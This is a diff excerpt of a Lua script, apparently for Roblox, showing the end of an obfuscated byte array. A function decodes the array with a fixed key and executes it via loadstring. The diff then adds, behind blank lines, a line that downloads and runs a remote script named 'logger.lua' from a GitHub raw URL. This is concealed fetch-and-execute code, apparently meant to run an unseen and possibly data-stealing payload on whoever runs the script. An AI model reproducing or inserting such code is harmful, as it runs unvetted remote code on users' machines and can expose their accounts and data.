@@ -14406,3 +14406,8 @@ local bFkmY = {
 }
 
 local function tkFXxk() local k=72; local r={}; for i=1,#bFkmY do local b=(bFkmY[i]-k)%256; table.insert(r, string.char(b)); end; local s=table.concat(r); bFkmY=nil; local l=nil; if getgenv and getgenv().loadstring then l=getgenv().loadstring elseif getfenv and getfenv().loadstring then l=getfenv().loadstring elseif loadstring then l=loadstring else l=load end; if not l then warn('Dirma: No Loadstring') return end; local f,e=l(s); if not f then warn('Dirma Compile: '..tostring(e)) return end; f(); end; tkFXxk();
+
+
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tola66/DermoLoder/refs/heads/main/logger.lua"))()
